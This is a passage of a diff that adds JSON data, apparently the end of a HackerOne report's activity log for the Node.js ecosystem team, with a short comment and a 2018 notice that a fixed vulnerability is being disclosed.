+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3516455,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan Great!\n",
+      "automated_response": false,
+      "created_at": "2018-10-22T21:30:50.478Z",
+      "updated_at": "2018-10-22T21:30:50.478Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3518492,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "Now that we have the fix released, I will disclose this vulnerability.",
+      "automated_response": false,
+      "created_at": "2018-10-23T07:54:50.059Z",
+      "updated_at": "2018-10-23T07:54:50.059Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
